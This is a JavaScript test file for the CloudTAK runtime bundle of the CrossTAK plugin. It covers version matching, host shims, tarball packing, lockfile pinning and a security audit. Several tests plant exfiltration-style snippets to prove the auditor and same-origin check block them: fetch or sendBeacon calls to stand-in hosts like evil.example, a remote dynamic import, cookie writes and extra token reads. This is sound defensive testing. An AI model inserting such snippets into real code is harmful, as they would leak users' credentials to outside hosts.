// SPDX-License-Identifier: AGPL-3.0-or-later
// Run: node --test test/
// The CloudTAK runtime bundle (bundle/): the version check, the host shims, the archive and the
// rules for living next to the compiled-in plugin. The full build needs a CloudTAK checkout;
// set CLOUDTAK_APP=/path/to/CloudTAK to run that part (it is skipped otherwise).
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, mkdtempSync } from 'node:fs';
import { gunzipSync } from 'node:zlib';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const here = (p) => fileURLToPath(new URL(p, import.meta.url));
const read = (p) => readFileSync(here(p), 'utf8');
const entry = read('../bundle/entry.ts');
const build = read('../bundle/build.mjs');

const { routeCompat, majorMinor } = await import('../bundle/compat.ts');
const { makeTarball, makeManifest, sha256 } = await import('../bundle/pack.mjs');
const { auditBundle, storedKeysRead } = await import('../bundle/audit.mjs');
const { checkAgainstLock, packageOf, bundledPackages } = await import('../bundle/deps.mjs');

// ---- the server part and the bundle must be the same version family ----

test('same major.minor is a match, patch releases do not matter', () => {
    assert.equal(routeCompat('0.6.1', '0.6.1').ok, true);
    assert.equal(routeCompat('0.6.0', '0.6.1').ok, true);
    assert.equal(routeCompat('0.6.9', '0.6.1').ok, true);
});

test('an older or newer server part gives a plain message that names both versions', () => {
    for (const route of ['0.5.2', '0.7.0', '1.0.0']) {
        const c = routeCompat(route, '0.6.1');
        assert.equal(c.ok, false, route);
        assert.match(c.message, /0\.6\.1/);
        assert.ok(c.message.includes(route), `message names ${route}`);
        assert.match(c.message, /Ask your CloudTAK admin/);
    }
});

test('a missing server part (no health route) gives a plain message, an unreadable version too', () => {
    const missing = routeCompat(undefined, '0.6.1');
    assert.equal(missing.ok, false);
    assert.match(missing.message, /server part is missing/);
    assert.equal(routeCompat('garbage', '0.6.1').ok, false);
    assert.equal(routeCompat(null, '0.6.1').ok, false);
    assert.equal(majorMinor('0.6.1-rc1'), '0.6');
    assert.equal(majorMinor(6), null);
});

test('the entry asks the server first and reads a 404 as a mismatch, a timeout as not one', () => {
    assert.match(entry, /await health\(\)/);
    assert.match(entry, /status === 404 \? routeCompat\(undefined/);
    assert.match(entry, /: \{ ok: true, message: '' \}/);
    // no GPS report and no Share change while the version does not match
    assert.match(entry, /const ok = \(await probe\(\)\)\.ok;\s+if \(!ok\) return;/);
});

// ---- living next to the compiled-in plugin ----

test('the bundle has its own menu key and route name, never the compiled-in ones', () => {
    const key = /export const MENU_KEY = '([^']+)'/.exec(entry)[1];
    const route = /export const ROUTE_NAME = '([^']+)'/.exec(entry)[1];
    const compiled = read('../plugin/index.ts');
    const compiledKey = /const MENU_KEY = '([^']+)'/.exec(compiled)[1];
    const compiledRoute = /const ROUTE_NAME = '([^']+)'/.exec(compiled)[1];
    assert.notEqual(key, compiledKey);
    assert.notEqual(route, compiledRoute);
    assert.equal(key, 'crosstak-runtime');
});

test('with the compiled-in CrossTAK installed the bundle adds nothing, so the menu shows it once', () => {
    const compiledRoute = /const ROUTE_NAME = '([^']+)'/.exec(read('../plugin/index.ts'))[1];
    assert.ok(entry.includes(`const COMPILED_IN_ROUTE = '${compiledRoute}'`), 'checks the compiled-in route name');
    assert.match(entry, /if \(api\.router\.hasRoute\(COMPILED_IN_ROUTE\)\) \{[\s\S]*return new CompiledInPresent\(\);/);
    const idle = /class CompiledInPresent[\s\S]*?\n\}\n/.exec(entry)[0];
    assert.doesNotMatch(idle, /menu\.add|routes\.add/);
});

test('the bundle uses the same panes as the compiled-in plugin, so CrossTAK PR 7 (clear markers on disable) is in it', () => {
    assert.match(entry, /import CrosstakContainer from '@crosstak\/lib\/CrosstakContainer\.vue'/);
    const pane = read('../plugin/lib/CrosstakContainer.vue');
    assert.match(pane, /async function clearAfterDisable/);
    assert.match(pane, /mapStore\.worker\.db\.remove\(String\(feat\.id\)\)/);
});

// ---- the host shims ----

test('the map store shim hands back the real store, or a stand-in that says why it cannot work', async () => {
    const host = await import('../bundle/shims/host.ts');
    const { useMapStore, hasMapStore, MapStoreMissing } = await import('../bundle/shims/map-store.ts');
    host.setApi({ pinia: { _s: new Map() } });
    assert.equal(hasMapStore(), false);
    assert.throws(() => useMapStore().worker, MapStoreMissing);
    const store = { gpsCoordinates: { lng: 1, lat: 2 } };
    host.setApi({ pinia: { _s: new Map([['cloudtak', store]]) } });
    assert.equal(hasMapStore(), true);
    assert.equal(useMapStore(), store);
    host.setApi({ pinia: {} });
    assert.equal(hasMapStore(), false);
});

test('the std shim sends the login the way CloudTAK does and reports the status of a refusal', async () => {
    const { std } = await import('../bundle/shims/std.ts');
    const prefs = { token: 'T0KEN', serverUrl: 'https://cloudtak.example' };
    globalThis.Capacitor = { Plugins: { Preferences: { get: async ({ key }) => ({ value: prefs[key] ?? null }) } } };
    const seen = [];
    const answer = { status: 200, json: { ok: true } };
    globalThis.fetch = async (url, init) => {
        seen.push({ url: String(url), init });
        return new Response(JSON.stringify(answer.json), { status: answer.status, headers: { 'Content-Type': 'application/json' } });
    };
    try {
        assert.deepEqual(await std('/api/crosstak/health'), { ok: true });
        assert.equal(seen[0].url, 'https://cloudtak.example/api/crosstak/health');
        assert.equal(seen[0].init.headers.Authorization, 'Bearer T0KEN');

        await std('/api/crosstak/send', { method: 'POST', body: { a: 1 } });
        assert.equal(seen[1].init.body, '{"a":1}');
        assert.equal(seen[1].init.headers['Content-Type'], 'application/json');

        answer.status = 404; answer.json = { status: 404, message: 'Not Found' };
        await assert.rejects(std('/api/crosstak/health'), (e) => e.message === 'Not Found' && e.status === 404);

        answer.status = 401; answer.json = {};
        await assert.rejects(std('/api/crosstak/health'), (e) => e.message === '401' && e.status === 401);
    } finally {
        delete globalThis.Capacitor;
    }
});

// ---- Security conditions 1 and 2 (ops #1410): what the bundle reads, and where it sends ----

function fakeBrowser(prefs) {
    const reads = [];
    globalThis.Capacitor = { Plugins: { Preferences: {
        get: async ({ key }) => { reads.push(key); return { value: prefs[key] ?? null }; },
        set: async () => { throw new Error('the bundle must never write a stored value'); },
        remove: async () => { throw new Error('the bundle must never remove a stored value'); },
    } } };
    globalThis.location = { origin: 'https://map.cloudtak.example' };
    const sent = [];
    globalThis.fetch = async (url, init) => {
        sent.push({ url: String(url), headers: init.headers });
        return new Response('{}', { status: 200, headers: { 'Content-Type': 'application/json' } });
    };
    return { reads, sent, done() { delete globalThis.Capacitor; delete globalThis.location; } };
}

test('condition 1: the std shim reads only the token and the server address, and writes nothing', async () => {
    const { std, READABLE_KEYS } = await import('../bundle/shims/std.ts');
    assert.deepEqual([...READABLE_KEYS], ['token', 'serverUrl']);
    const b = fakeBrowser({ token: 'T0KEN', serverUrl: 'https://cloudtak.example', refresh: 'R', sessionId: 'S' });
    try {
        await std('/api/crosstak/health');
        await std('/api/crosstak/send', { method: 'POST', body: { a: 1 } });
        assert.ok(b.reads.length > 0);
        assert.deepEqual([...new Set(b.reads)].sort(), ['serverUrl', 'token']);
        assert.ok(b.sent.every((r) => !JSON.stringify(r).includes('"R"') && !JSON.stringify(r).includes('"S"')));
    } finally { b.done(); }
});

test('condition 2: a request to another origin is refused before anything is sent', async () => {
    const { std } = await import('../bundle/shims/std.ts');
    const b = fakeBrowser({ token: 'T0KEN', serverUrl: 'https://cloudtak.example' });
    try {
        for (const url of ['https://evil.example/steal', 'http://cloudtak.example/api/x', 'https://cloudtak.example.evil.example/api/x', 'https://cloudtak.example:8443/api/x']) {
            await assert.rejects(std(url), /only to your CloudTAK server/, url);
        }
        assert.equal(b.sent.length, 0, 'nothing went out');
        // the server's own origin still works, as a path and as a full URL
        await std('/api/crosstak/health');
        await std('https://cloudtak.example/api/crosstak/health');
        assert.deepEqual(b.sent.map((r) => r.url), ['https://cloudtak.example/api/crosstak/health', 'https://cloudtak.example/api/crosstak/health']);
        assert.ok(b.sent.every((r) => r.headers.Authorization === 'Bearer T0KEN'));
    } finally { b.done(); }
});

test('condition 2: with no stored server address the page origin is the server', async () => {
    const { std } = await import('../bundle/shims/std.ts');
    const b = fakeBrowser({ token: 'T0KEN' });
    try {
        await std('/api/crosstak/health');
        await assert.rejects(std('https://evil.example/x'), /only to your CloudTAK server/);
        assert.deepEqual(b.sent.map((r) => r.url), ['https://map.cloudtak.example/api/crosstak/health']);
    } finally { b.done(); }
});

// ---- the built file is read for the rules (needs no CloudTAK checkout: it reads planted code too) ----

const GOOD = 'async function A(e){let t=B();if(t){let n=await t.get({key:e});return n&&n.value||void 0}try{return localStorage.getItem(`CapacitorStorage.${e}`)||void 0}catch{return}}'
    + 'async function Y(){let a=await A("token");let u=await A("serverUrl");return fetch(u,{headers:{Authorization:`Bearer ${a}`}})}console.info("CrossTAK bundle: idle");';

test('audit: a clean file passes and the two keys are found', () => {
    assert.deepEqual(storedKeysRead(GOOD), { found: true, keys: ['serverUrl', 'token'], dynamic: 0 });
    assert.deepEqual(auditBundle(GOOD), []);
});

test('audit: each planted break is caught (red twins of the Security conditions)', () => {
    const planted = {
        'another stored key': GOOD + 'A("refreshToken");',
        'a stored key from a variable': GOOD + 'A(x+"Token");',
        'a storage write': GOOD + 'localStorage.setItem("t",1);',
        'a second fetch': GOOD + 'fetch("https://evil.example");',
        'a beacon': GOOD + 'navigator.sendBeacon("/x");',
        'a socket': GOOD + 'new WebSocket("wss://x");',
        'a cookie': GOOD + 'document.cookie="a=1";',
        'a dynamic import': GOOD + 'import("https://x/a.js");',
        'a log line with a value': GOOD + 'console.log(token);',
        'a Preferences write': GOOD + 'B().set({key:"token",value:"x"});',
    };
    for (const [what, code] of Object.entries(planted)) assert.notDeepEqual(auditBundle(code), [], what);
});

// ---- Security condition 4: built from the lock ----

test('condition 4: the bundle dependencies are pinned exactly and the lock names them', () => {
    const pkg = JSON.parse(read('../bundle/package.json'));
    const lock = JSON.parse(read('../bundle/package-lock.json'));
    assert.ok(Object.keys(pkg.dependencies).length > 0);
    for (const [name, range] of Object.entries(pkg.dependencies)) {
        assert.match(range, /^\d+\.\d+\.\d+$/, `${name} is pinned to one version`);
        assert.equal(lock.packages[`node_modules/${name}`].version, range);
    }
    for (const [name, entry] of Object.entries(lock.packages)) {
        if (name) assert.match(entry.integrity, /^sha512-/, `${name} has an integrity hash`);
    }
    assert.equal(lock.packages[''].dependencies['@tabler/icons-vue'], pkg.dependencies['@tabler/icons-vue']);
});

test('condition 4: a bundled package that the lock does not list, or lists at another version, stops the build', () => {
    const lock = { packages: { 'node_modules/a': { version: '1.0.0', integrity: 'sha512-x' } } };
    assert.deepEqual(checkAgainstLock([{ name: 'a', version: '1.0.0' }], lock), []);
    assert.match(checkAgainstLock([{ name: 'a', version: '1.0.1' }], lock)[0], /lock says 1\.0\.0/);
    assert.match(checkAgainstLock([{ name: 'b', version: '1.0.0' }], lock)[0], /not in the lock/);
    assert.equal(packageOf('/x/bundle/node_modules/@tabler/icons-vue/dist/a.mjs'), '@tabler/icons-vue');
    assert.equal(packageOf('/x/bundle/node_modules/foo/node_modules/bar/i.js'), 'bar');
    assert.equal(packageOf('/x/bundle/entry.ts'), null);
});

test('condition 4: the build resolves bare imports only from bundle/node_modules', () => {
    assert.match(build, /locked-imports\.ts/);
    assert.match(build, /npm ci --prefix bundle/);
    assert.doesNotMatch(build, /path\.join\(app, 'src\/main\.ts'\), \{ \.\.\.opts/);
});

// ---- the archive ----

function untar(buf) {
    const files = {};
    for (let off = 0; off + 512 <= buf.length;) {
        const head = buf.subarray(off, off + 512);
        if (head.every((b) => b === 0)) break;
        const name = head.subarray(0, 100).toString('utf8').replace(/\0.*$/, '');
        const size = parseInt(head.subarray(124, 136).toString('utf8').replace(/\0.*$/, ''), 8);
        files[name] = buf.subarray(off + 512, off + 512 + size);
        off += 512 + Math.ceil(size / 512) * 512;
    }
    return files;
}

test('the archive holds exactly manifest.json and index.js, and the manifest hash is the hash of index.js', () => {
    const index = Buffer.from('export default { install() {} };\n');
    const files = untar(gunzipSync(makeTarball(index, '0.6.1')));
    assert.deepEqual(Object.keys(files).sort(), ['index.js', 'manifest.json']);
    const manifest = JSON.parse(files['manifest.json'].toString());
    assert.equal(manifest.sha256, sha256(files['index.js']));
    assert.equal(manifest.version, '0.6.1');
    assert.equal(manifest.api_version, 1);
    // only keys CloudTAK's manifest schema knows
    const allowed = new Set(['name', 'version', 'description', 'author', 'license', 'homepage', 'logo', 'sha256', 'api_version']);
    for (const k of Object.keys(manifest)) assert.ok(allowed.has(k), `unknown manifest key ${k}`);
    assert.match(manifest.homepage, /^https?:\/\//);
});

test('the same input gives the same archive bytes', () => {
    const index = Buffer.from('x');
    assert.deepEqual(makeTarball(index, '1.0.0'), makeTarball(index, '1.0.0'));
    assert.throws(() => makeManifest(index, 'bad version!'));
});

// ---- the build (needs a CloudTAK checkout) ----

const cloudtak = process.env.CLOUDTAK_APP;
test('the built bundle has no bare import, takes Vue from the host, and uses its own menu key', { skip: !cloudtak && 'set CLOUDTAK_APP to a CloudTAK checkout' }, async () => {
    const { buildBundle, routeVersion } = await import('../bundle/build.mjs');
    const out = mkdtempSync(path.join(tmpdir(), 'crosstak-bundle-'));
    const res = await buildBundle({ cloudtak, out });
    assert.equal(res.version, routeVersion(), 'bundle version is the server part version');
    const code = readFileSync(path.join(out, 'index.js'), 'utf8');
    assert.doesNotMatch(code, /(^|[;\n}])\s*import\s*(?:[\w*${}\s,]+from\s*)?["']/);
    assert.doesNotMatch(code, /\bimport\(/);
    assert.match(code, /globalThis\.__CLOUDTAK__/);
    assert.match(code, /crosstak-runtime/);
    assert.match(code, /home-menu-plugin-crosstak-runtime/);
    assert.match(code, /"\/api\/crosstak"/);
    assert.match(code, /\$\{\w+\}\/health/);
    const again = await buildBundle({ cloudtak, out: mkdtempSync(path.join(tmpdir(), 'crosstak-bundle-')) });
    assert.equal(again.indexSha256, res.indexSha256, 'same source, same bytes');
    assert.equal(again.tgzSha256, res.tgzSha256, 'same archive bytes');

    // Security conditions 1, 2 and 3 on the built file
    assert.deepEqual(auditBundle(code), []);
    assert.deepEqual(storedKeysRead(code).keys, ['serverUrl', 'token']);

    // condition 4: the packages inside the file are the locked ones, listed for the SBOM, and the
    // archive hash is the one the release notes carry
    const lock = JSON.parse(read('../bundle/package-lock.json'));
    assert.deepEqual(res.packages.map((p) => p.name), ['@tabler/icons-vue']);
    assert.deepEqual(checkAgainstLock(res.packages, lock), []);
    const deps = JSON.parse(readFileSync(res.depsFile, 'utf8'));
    assert.equal(deps.bundle, `crosstak-${res.version}.tar.gz`);
    assert.deepEqual(deps.packages, res.packages);
    assert.equal(res.tgzSha256, sha256(readFileSync(res.tgz)));
});

test('the build script reads the version from the route file and keeps the host modules out', () => {
    assert.match(build, /const VERSION = /);
    for (const spec of ['vue', 'vue-router', '@tak-ps/vue-tabler']) assert.ok(build.includes(`'${spec}'`), spec);
});
